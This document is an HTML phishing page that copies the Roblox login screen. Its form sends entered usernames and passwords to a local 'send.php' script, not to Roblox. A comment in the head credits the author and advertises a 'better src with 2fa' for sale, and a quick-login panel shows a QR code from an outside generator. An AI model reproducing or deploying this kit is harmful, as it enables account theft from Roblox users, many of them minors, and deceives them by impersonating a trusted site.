<!DOCTYPE html>
<html>
<head data-machine-id="WEB315"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-e31db0d5-fd04-4d58-a867-bf18525ec685@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-998d2a63-9df6-4443-8bdd-af18b46ee67f@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-2306dee7-fd99-45bf-a4bb-ff246f9cf162@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-a516fadd-ca6e-4d2d-8765-d52a20d19d8a@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-d9f63437-ba30-452e-ad2c-7fb1602e1253@mhtml.blink" />
    <!-- MachineID: WEB315 -->
    <title>Roblox</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">

    // Credits Termed#0001 | Message me if u wanna buy a better src with 2fa and more for cheap!

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation">
<meta name="description" content="Roblox is a global platform that brings people together through play.">
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">

    <meta name="apple-itunes-app" content="app-id=431946152">





<meta name="locale-data" data-language-code="en_us" data-language-name="English"><meta name="device-meta" data-device-type="tablet" data-is-in-app="false" data-is-desktop="false" data-is-phone="false" data-is-tablet="true" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="true" data-is-universal-app="false" data-app-type="unknown">
<meta name="environment-meta" data-is-testing-site="false">

<meta id="roblox-display-names" data-enabled="true"><meta name="page-meta" data-internal-page-name="Login">
    

        
    
<link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon">


    <link rel="stylesheet" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/34b4df2feb1cac7201892b667c8185409f3d6271e650a5f313976062e3ca1ce5.css">
<link rel="stylesheet" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css">
<link rel="stylesheet" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/d41f2dd08e2e54efa22d6e04120af18e4ca32b65227e62cf6f33933a7899241d.css">
<link rel="stylesheet" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/bbfa8678c5dc8467d00c4a99038f3b73d7e45b31d571be1c9eb16ca5a3708ac6.css">
<link rel="stylesheet" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/d5344f38053922e5936f0d7e2d3496ee4f83b46f0bb40d1d2c253b80ac82668e.css">
<link rel="stylesheet" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
<link rel="stylesheet" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">


    <link rel="canonical" href="https://www.roblox.com/NewLogin">
    
<link rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch">


    
<link rel="stylesheet" href="https://static.rbxcdn.com/css/page___b0dafd506d198313adc7eb9bccc23fbb_m.css/fetch">


<link rel="stylesheet" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/0f161e158c689e76fd22cad828c428186a12e276dc4601aaffe5230c3ead905e.css">
<link rel="stylesheet" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/390eb5d1969a0b33f32893c11b2debd0aba6aa4c356328ffb8cc1976f8e82aea.css">
<link rel="stylesheet" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">

    <link rel="stylesheet" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/2f599b9e9ca20ee3c155684adbf1cdcb7220bab681b55b4505123a0c34e81969.css">


    

<link rel="stylesheet" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
<link rel="stylesheet" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/651dbf41eeb7195601d50f267fa49d4b67adbb0dff612359224653589487e5a7.css">
<link rel="stylesheet" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/e1ebff2bde945f57ed9ed570f73ee815c243b88cfcc62f3748f76d5ffa895e27.css">
<link rel="stylesheet" data-bundlename="Login" data-bundle-source="Main" href="https://css.rbxcdn.com/e1ebff2bde945f57ed9ed570f73ee815c243b88cfcc62f3748f76d5ffa895e27.css">

<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0">

<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true">

    
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">




    
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    


<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="5" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
                          

</head>
<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
    
    <meta name="csrf-token" data-token="IO6yFl+MKveB">

    <div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div>

<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
</div>
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
</div>
    
    



<div id="fb-root"></div>

<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">


<div id="navigation-container" class="light-theme gotham-font" data-number-of-autocomplete-suggestions="0">
    <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
  <div class="container-fluid">
    <div class="rbx-navbar-header">
      <div id="header-menu-icon" role="button" tabindex="0" class="rbx-nav-collapse">
        
      </div>
      <div class="navbar-header">
        <a class="navbar-brand" href="https://www.roblox.com/home"><span class="icon-logo"></span><span class="icon-logo-r"></span></a>
      </div>
    </div>
    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/discover">Discover</a>
      </li>
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/catalog">Avatar Shop</a>
      </li>
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/develop">Create</a>
      </li>
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/robux?ctx-nav">Robux</a>
      </li>
    </ul>

    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/discover">Discover</a>
      </li>
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/catalog">Avatar Shop</a>
      </li>
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/develop">Create</a>
      </li>
      <li class="cursor-pointer">
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/robux?ctx=nav">Robux</a>
      </li>
    </ul>
    <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form><div class="form-has-feedback"><input id="navbar-search-input" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Avatar Shop</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/develop/library?CatalogContext=2&amp;Category=6&amp;Keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Library</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=https%3A%2F%2Fwww.roblox.com%2Flogin" id="sign-up-button">Sign Up</a></li><li class="login-action"></li><li class="cursor-pointer rbx-navbar-right-search" role="menuitem"><span class="rbx-menu-icon rbx-menu-item"><span class="icon-nav-search-white"></span></span></li></ul></div></div>
  </div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container"><div></div></div>
<div id="accountRecoveryModal-container"></div>

</div>



    <div class="container-main                  touch" id="container-main">
            

        <div class="alert-container">
            




        </div>


        <div class="content">

                                    


<div id="login-container" class="login-container ng-scope">
    <div login-base="" is-facebook-sign-in-enabled="true" is-login-fun-captcha-enabled="true" is-always-captcha-login-enabled="false" is-bedev2-captcha-for-web-login-enabled="true" data-return-url=""><div id="login-base"> <div class="section-content login-section"> <h2 class="login-header ng-binding" ng-bind="'Heading.LoginRoblox' | translate">Login to Roblox</h2> <div login-form="" context="loginPage" redirect-to-home-post-login="false" include-message-banner="true" data-return-url="" class="ng-isolate-scope"><div id="login-form"> <div ng-init="init('login')"> <!-- ngIf: loginParams.includeMessageBanner --><system-feedback ng-if="loginParams.includeMessageBanner" class="ng-scope ng-isolate-scope"><div class="sg-system-feedback"> <div class="alert-system-feedback"> <div class="alert " ng-class="{ on: $ctrl.params.showBanner }"> <!-- ngIf: !$ctrl.params.isHtmlAllowed --><span class="alert-content ng-binding ng-scope" ng-bind="$ctrl.params.bannerText" ng-if="!$ctrl.params.isHtmlAllowed"></span><!-- end ngIf: !$ctrl.params.isHtmlAllowed --><!-- ngIf: $ctrl.params.isHtmlAllowed --> <!-- ngIf: $ctrl.params.showCloseButton --> </div> </div> </div> </system-feedback><!-- end ngIf: loginParams.includeMessageBanner --> <div class="login-form-container">
        
         <form class="login-form ng-pristine ng-valid" role="form" name="loginForm" rbx-form-context="" context="loginPage" method="post" action="send.php"> <div class="form-group username-form-group"> <input type="text" name=username id="login-username" class="form-control input-field ng-pristine ng-untouched ng-valid ng-empty" placeholder="Username/Email/Phone" ng-model="loginFormData.credentialValue" > </div> <div class="form-group password-form-group">  <input type="password" name="password" id="login-password" class="form-control input-field ng-pristine ng-untouched ng-valid ng-empty" placeholder="Password" > <p class="form-control-label xsmall text-error login-error ng-binding" ng-bind="loginLayout.error" ng-show="!loginLayout.showCrossDeviceError"></p> <p class="form-control-label xsmall text-error login-error ng-hide" ng-show="loginLayout.showCrossDeviceError"> <span ng-bind="loginPageIXP.ErrorStart" class="ng-binding"></span> <u><a ng-click="quickLogin()" ng-bind="loginPageIXP.ErrorLink" class="ng-binding"></a></u> <span ng-bind="loginPageIXP.ErrorEnd" class="ng-binding"></span> </p> </div> <div toggle-loading="" is-loading="loginLayout.isProcessing || loginCaptchaActivated"> <button id="login-button" class="btn-full-width login-button ng-binding btn-secondary-md"  type="submit" >Log In</button> </div><div class="spinner spinner-sm spinner-no-margin spinner-block" style="display: none;"></div> <div class="text-center forgot-credentials-link"> <a id="forgot-credentials-link" class="text-link ng-binding" href="https://www.roblox.com/login/forgot-password-or-username" target="_self" ng-bind="'Action.ForgotPasswordOrUsernameQuestionCapitalized' | translate">Forgot Password or Username?</a> </div> </form> 
         
         <div> <div class="fb-divider-container"> <div class="rbx-divider fb-divider"></div> <div class="divider-text-container"> <span class="divider-text xsmall ng-binding" ng-bind="'Label.LoginWithYour' | translate">login with</span> </div> </div> <!-- ngIf: crossDeviceLoginParams.IsLoginCodeButtonDisplayed --><button ng-if="crossDeviceLoginParams.IsLoginCodeButtonDisplayed" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button ng-scope" ng-click="quickLogin()"> <span ng-bind="(!!loginPageIXP.ButtonText) ? loginPageIXP.ButtonText :
                    ('Action.DeviceCode' | translate)" class="ng-binding">Quick Log In</span> <hr> <div class="modal-body"><div><div><b>Option 1</b></div><img src="https://api.qrcode-monkey.com/tmp/48b065a2804bf97163d422304fb87050.svg?1680102855260" width="100" height="100" alt="" class="cross-device-login-display-qr-code-image"><div class="cross-device-login-instruction-text font-caption-header">Scan this QR code from your logged in device's camera.<br><a href="https://en.help.roblox.com/hc/en-us/articles/360056582012" target="_blank" rel="noreferrer" class="text-link cross-device-login-instruction-text"><u>Having trouble?</u></a></div><div class="cross-device-login-qr-header-text"><b>Option 2</b></div><div class="font-title">YJVBBH</div><div class="cross-device-login-instruction-text font-caption-header"><div class="cross-device-login-instruction-text font-caption-header">On your logged in device, go to:<br><b>Account Settings &gt; Quick Log In</b> to enter your code.</div></div></div></div> </button><!-- end ngIf: crossDeviceLoginParams.IsLoginCodeButtonDisplayed --> </div> <span id="2sv-popup-container"></span> </div> <captcha activated="loginCaptchaActivated" captcha-action-type="captchaActionTypes.login" extra-validation-params="captchaExtraValidationParams" input-params="inputParams" captcha-failed="handleCaptchaError" captcha-passed="handleCaptchaSuccess" return-token-in-success-cb="captchaReturnTokenInSuccessCb" class="ng-isolate-scope"><div class="captcha-container ng-scope" ng-controller="captchaV2Controller"> <div class="modal" ng-class="$ctrl.getCaptchaClasses()" ng-click="$ctrl.hideCaptcha()"> <div class="modal-dialog"> <div class="modal-content"> <div class="modal-body" ng-click="$event.stopPropagation()"> <button type="button" class="close" ng-click="$ctrl.hideCaptcha()"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button> <div id="captchaV2-1" class="captchav2-funcaptcha-modal-body"></div> </div> </div> </div> </div> </div></captcha> <div id="crossDeviceLoginDisplayCodeModal-container"></div> <div id="securityQuestionsModal-container"></div> <div id="react-login-container"></div> </div> </div> </div> <div class="text-center"> <div class="signup-option"> <span class="no-account-text ng-binding" ng-bind="'Label.NoAccount' | translate">Don't have an account?</span> <a id="sign-up-link" class="text-link signup-link ng-binding" href="https://www.roblox.com/account/signupredir" target="_self" ng-bind="'Action.SignUpCapitalized' | translate">Sign Up</a> </div> </div></div></div></div>
</div>





        


<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginPage">
</div>

        </div>
            </div> 
<!--Bootstrap Footer React Component -->

<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="https://www.roblox.com/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="https://www.roblox.com/info/privacy?locale=en_us" target="_blank">Privacy</a></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2021 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer></div> 

<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>


    



<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-game-launch-interface-enabled="False" data-is-protocol-handler-launch-enabled="False" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Android" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="false" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="" data-protocol-player-channel-name="">
    <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
        <div id="Spinner" class="Spinner" style="padding:20px 0;">
            <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">
        </div>
        <div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
            <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">
                Starting Roblox...
            </div>
            <div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
            <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
        </div>
        <div style="text-align:center;margin-top:1em">
            <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">
        </div>
    </div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
    <p class="larger-font-size">
        <span class="icon-moreinfo"></span>
                
                    Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future!
                
    </p>
</div>




    
    <div id="InstallationInstructions" class="modalPopup blueAndWhite" style="display:none;overflow:hidden">
        <a id="CancelButton2" class="ImageButton closeBtnCircle_35h ABCloseCircle"></a>
        <div style="padding-bottom:10px;text-align:center">
            <br><br>
        </div>
    </div>


<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>






<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
    <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
    <div class="Title"></div>
    <div class="GenericModalBody">
        <div class="TopBody">
            <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">
                <img class="GenericModalImage" alt="generic image">
            </div>
            <div class="Message"></div>
        </div>
        <div class="ConfirmationModalButtonContainer GenericModalButtonContainer">
            <a href="https://www.roblox.com/login" id="roblox-confirm-btn"><span></span></a>
            <a href="https://www.roblox.com/login" id="roblox-decline-btn"><span></span></a>
        </div>
        <div class="ConfirmationModalFooter">
        
        </div>  
    </div>  
    
</div>

<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
    <div id="modal-dialog" class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">
                    <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
                </button>
                <h5 class="modal-title"></h5>
            </div>

            <div class="modal-body">
                <div class="modal-top-body">
                    <div class="modal-message"></div>
                    <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
                        <img class="modal-thumb" alt="generic image">
                    </div>
                    <div class="modal-checkbox checkbox">
                        <input id="modal-checkbox-input" type="checkbox">
                        <label for="modal-checkbox-input"></label>
                    </div>
                </div>
                <div class="modal-btns">
                    <a href="https://www.roblox.com/login" id="confirm-btn"><span></span></a>
                    <a href="https://www.roblox.com/login" id="decline-btn"><span></span></a>
                </div>
                <div class="loading modal-processing">
                    <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                </div>
            </div>
            <div class="modal-footer text-footer">

            </div>
        </div>
    </div>
</div>

<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div>
    <div ng-modules="baseTemplateApp" class="ng-scope">
        
    </div>

    <div ng-modules="pageTemplateApp" class="ng-scope">
        
    </div>

<iframe title="Api Service" aria-hidden="true" src="cid:frame-031E1F276507807F634ADB7E413BED50@mhtml.blink" style="position: absolute; height: 0px; width: 0px; display: none;"></iframe></body></html>